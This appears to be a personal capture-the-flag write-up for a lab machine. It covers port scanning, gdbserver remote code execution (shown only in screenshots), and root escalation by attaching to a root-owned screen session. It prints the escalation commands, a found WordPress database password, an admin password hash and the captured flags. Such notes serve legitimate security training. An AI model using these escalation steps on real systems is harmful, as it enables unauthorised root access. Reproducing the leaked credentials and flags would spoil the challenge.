# Lessons learned
- understand commands being executed. read the manual and break down the flags.

# Writeup 
## Recon

## autorecon

```
python3 /home/kali/tools/AutoRecon/autorecon.py -t targets.txt -v
```
![](Pasted%20image%2020231017182439.png)

ports
- 22
- 80
- 1337

## Initial Access
Found GNU gdbserver RCE? 
![](Pasted%20image%2020231017182856.png)

Exploiting it
![](Pasted%20image%2020231017182924.png)
![](Pasted%20image%2020231017182930.png)
![](Pasted%20image%2020231017182937.png)

## Privesc
Getting better shell with pwncat
![](Pasted%20image%2020231017183129.png)

uploading tools
![](Pasted%20image%2020231017183916.png)

linpeas
![](Pasted%20image%2020231017183935.png)
wordpress creds?
```
MQYBJSaD#DxG6qbm
```
![](Pasted%20image%2020231017184640.png)

```
mysql -u wordpressuser -p 
```

admin hash from mysql db
```
$P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5.
```
![](Pasted%20image%2020231017194703.png)


pspy64
![](Pasted%20image%2020231017184225.png)
screen version 4.8.0
![](Pasted%20image%2020231017185751.png)

Basically this command runs a screen session as root and names it "root"
```
find /var/run/screen/S-root/ -empty -exec screen -dmS root 
```

reading the manual for screen helped a lot!
![](Pasted%20image%2020231017195330.png)

attaching to the root screen (`CTRL+a` then `d` to detach, like tmux)

```
screen -r root/root
```
![](Pasted%20image%2020231017195229.png)

## Loot
user.txt
```
ab0071851d3cd5f7a4a9574a4b78f17b
```
![](Pasted%20image%2020231017182959.png)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

root.txt
```
9acb3a7dd3475b434ab2a4f4d86a4d22
```

![](Pasted%20image%2020231017195411.png)